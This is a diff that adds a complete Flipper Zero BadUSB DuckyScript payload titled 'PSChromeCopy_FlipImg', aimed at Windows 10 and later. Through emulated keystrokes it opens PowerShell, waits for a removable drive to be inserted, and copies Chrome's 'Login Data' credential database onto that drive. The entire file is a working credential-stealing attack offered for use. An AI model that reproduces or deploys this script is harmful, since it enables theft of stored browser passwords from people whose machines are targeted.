@@ -1,0 +1,24 @@
+REM Title: PSChromeCopy_FlipImg
+REM Author: aves-frog
+REM Description: Copies Chrome Login Data to flipper img/Last inserted USB
+REM Target:	Windows 10+
+REM
+DEFAULTDELAY 5
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 5000
+STRING Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange
+ENTER
+DELAY 10
+STRING cd $env:LOCALAPPDATA
+ENTER
+DELAY 10
+STRING cd "Google/Chrome/User Data/Default"
+ENTER
+DELAY 10
+STRING $Time = Get-Date -Format "dd-MM-yyyy-HH-mm-ss"
+ENTER
+STRING $newEvent = Wait-Event -SourceIdentifier volumeChange; Start-Sleep -Seconds 2; $DriveLetter = volume | ? drivetype -eq removable | % driveletter; $Path = $DriveLetter + ":/" + $Time + ".txt"; Copy-Item -Path "./Login Data" -Destination $Path -Recurse; exit
+ENTER
